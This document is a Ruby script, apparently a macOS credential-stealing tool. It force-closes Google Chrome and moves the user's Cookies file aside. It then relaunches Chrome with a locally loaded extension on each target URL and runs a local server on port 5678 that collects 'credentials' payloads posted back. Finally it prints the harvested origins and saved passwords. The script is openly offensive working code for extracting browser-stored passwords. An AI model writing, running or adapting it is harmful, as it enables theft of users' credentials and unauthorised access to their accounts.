#!/usr/bin/env ruby
require 'uri'
require 'json'
require 'socket'
require 'net/http'

def _close_chrome
    `pkill -a -i "Google Chrome"`
end

def _open_chrome_with_extension(trustedUrl)
    pid = nil
    reader, writer = IO.pipe

    _close_chrome
    
    cmd = "\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --load-extension=#{Dir.getwd}/extension #{trustedUrl} --window-size=200,200  > /dev/null"
    pid = Process.spawn(cmd, [:out, :err] => writer)
    Process.detach(pid)
end

def log(msg, verbose)
    if verbose != true
        return
    end
    puts msg
end

def main(urls, siteTimeout, moveCookies, outputFormat, verbose)
    credentials = []

    server_thread = Thread.new do
        server = TCPServer.open(5678)
        loop {
            socket = server.accept

            headers = {}
            method, path = socket.gets.split
            
            while line = socket.gets.split(" ", 2)
                break if line[0] == ""
                headers[line[0].chop] = line[1].strip
            end

            post_body = socket.read(headers["Content-Length"].to_i)

            begin
                jsonData = JSON.parse(post_body)
                if jsonData["type"] == "credentials"
                    credentials.push(jsonData["payload"])
                end
            rescue
                puts "[!] failed to parse post body"
            end
            
            socket.puts("HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK\r\n")
            socket.close
        }
    end

    main_thread = Thread.new do
        _close_chrome

        if moveCookies == true
            log "[+] temporarily move the \"Cookies\" file", verbose
            `mv "#{Dir.home}/Library/Application Support/Google/Chrome/Default/Cookies" /tmp/Cookies`
        end

        urls.each {|url, index|
            log "[+] extracting passwords from #{url}...", verbose
            _open_chrome_with_extension url
            sleep siteTimeout
        }
        
        log "[+] closing HTTP server", verbose
        server_thread.kill
        
        log "[+] closing browser", verbose
        _close_chrome

        if moveCookies == true
            log "[+] move the \"Cookies\" file back", verbose
            `mv /tmp/Cookies "#{Dir.home}/Library/Application Support/Google/Chrome/Default/Cookies"`
        end

        case outputFormat
            when "json"
                puts credentials.to_json
            when "text"
                credentials.each {|cred|
                    puts "origin:", cred["origin"], "\ncredentials:", cred["credentials"], "========================"
                }
        end
    end

    main_thread.join
    server_thread.join
end
